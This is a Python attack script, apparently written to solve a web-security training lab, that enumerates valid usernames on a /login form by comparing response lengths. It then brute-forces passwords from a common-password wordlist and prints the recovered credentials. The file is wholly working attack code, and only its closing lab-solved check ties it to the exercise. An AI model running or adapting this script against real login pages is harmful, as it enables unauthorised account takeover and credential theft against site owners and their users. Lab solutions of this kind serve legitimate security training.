import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def bruteforce_username_based_on_length_response(s, url, path, list_usernames):
    target_url = url + path
    res, count = {}, {}
    for username in list_usernames:
        payload = {
            'username': username,
            'password': 'test'
        }
        r = s.post(target_url, data=payload)
        
        length = len(r.text)
        res[username] = length
        count[length] = count.get(length, 0) + 1

    valid_usernames = []
    for username, length in res.items():
        if count[length] == 1:
            valid_usernames.append(username)
    return valid_usernames

def bruteforce_password_based_on_length_response(s, url, path, list_passwords, valid_usernames):
    target_url = url + path
    res, count = {}, {}
    valid_account = []
    for valid_username in valid_usernames:
        for password in list_passwords:
            payload = {
                'username': valid_username,
                'password': password
            }
            r = s.post(target_url, data=payload)
            
            length = len(r.content)
            count[length] = count.get(length, 0) + 1
            res[password] = length

        valid_account = []
        for password, length in res.items():
            if count[length] == 1:
                valid_account.append((valid_username, password))
                break
    return valid_account

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].rstrip('/')

    list_usernames = open('./../common_username.txt', 'r', encoding='utf-8').read().strip().split('\n')
    list_passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')

    valid_usernames = bruteforce_username_based_on_length_response(s, url, '/login', list_usernames)
    print(valid_usernames)
    valid_account = bruteforce_password_based_on_length_response(s, url, '/login', list_passwords, valid_usernames)
    print("List valid credentials")
    print(valid_account)

    check_solved_lab(s, url)

if __name__ == '__main__':
    main()